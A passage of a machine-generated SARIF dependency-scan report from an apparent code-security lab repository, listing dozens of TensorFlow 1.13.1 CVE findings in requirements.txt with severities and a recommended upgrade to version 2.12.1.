            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21740 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21740](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21740)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c4e3f7510e26a7acc053136ea0602028ca9e3f0c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21727",
          "ruleIndex": 271,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21727 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21727](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21727)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "79cb5664b3fc18485b3d33e1a11b0389953ddf6f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23584",
          "ruleIndex": 272,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23584 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23584](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23584)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "b64571e271475f4233b5af0946feb09d13ed85f8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23574",
          "ruleIndex": 273,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23574 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23574](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23574)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "bf3470116b071c58cbbd7f272f96ede858bd6b3f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23569",
          "ruleIndex": 274,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23569 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23569](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23569)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "77c6c4ff1762b8f6357572e8506bdf334e760e88"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23571",
          "ruleIndex": 275,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23571 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23571](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23571)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "6f5b4f5f9f11daad22c1043b3f7b2e661a560fce"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23576",
          "ruleIndex": 276,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23576 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23576](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23576)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7a19782115327c2d5f22d484cc9d79abaca80a89"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23588",
          "ruleIndex": 277,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23588 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23588](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23588)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "81886a8fe49c9439a1e8445416ac2d5a6cb6c64e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23580",
          "ruleIndex": 278,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23580 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23580](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23580)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f3d7cb64a8f4579c628be7577dd8139841cc149a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21738",
          "ruleIndex": 279,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21738 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21738](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21738)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5c05f199b1d878c8042aabfe978cbcc3352b09a4"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23579",
          "ruleIndex": 280,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23579 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23579](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23579)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "959cff70f866574aff735879eb3ccc53da4b3fda"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23582",
          "ruleIndex": 281,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23582 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23582](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23582)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "cd14872e8d5bfd48790051fa8012d9d5e73529a8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23589",
          "ruleIndex": 282,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23589 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23589](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23589)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "84c12b142fd90f1d0eceaf4328da25807ebbade8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23564",
          "ruleIndex": 283,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23564 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23564](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23564)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "df61ac930a34e55a202415f330565e99269510c5"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23563",
          "ruleIndex": 284,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23563 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23563](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23563)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "53f25f889e1f4f64542e8acff54d95a19fc0da66"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23583",
          "ruleIndex": 285,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23583 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23583](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23583)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "01ba559263e10f20c3a2c3d2a101188430684bcc"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21741",
          "ruleIndex": 286,
          "level": "error",
          "message": {
